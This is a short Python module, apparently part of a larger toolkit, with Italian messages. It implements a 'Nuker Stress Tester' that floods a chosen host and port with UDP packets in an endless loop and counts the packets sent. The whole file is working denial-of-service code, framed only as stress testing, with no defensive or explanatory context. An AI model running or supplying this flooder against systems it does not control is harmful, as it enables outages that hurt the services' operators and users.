#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys,socket,random

end = '\033[0m'
red = '\033[1;31m'
bright_yellow = '\033[1;33m'

def final():
    import nelson as n
    n.main()

def sender(message,host,port):
    UDPSock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    try:
        UDPSock.sendto(message, (host,port))
    except socket.error:
        print("[%s-%s] Bersaglio non raggiungibile\n"%(red,end))
        final()
    except socket.gaierror:
        print("\n[%s-%s] Connessione col bersaglio non riuscita\n"%(red,end))
        final()
    except KeyboardInterrupt:
        print("\n[%s-%s] Interrotto\n"%(red,end))
        final()

def nuker(target,port):
    print ("\n[#] Nuker Stress Tester\n")
    message = "Hello my friend :)"
    host = bytes(target)
    sent = 0
    while True:
        try:
            sender(message,host,port)
            sent += 1
            sys.stdout.write("\r[%s*%s] Pacchetti inviati: %s "%(bright_yellow,end, sent))
            sys.stdout.flush()
        except KeyboardInterrupt:
            print("\n[%s-%s] Interrotto\n"%(red,end))
            final()
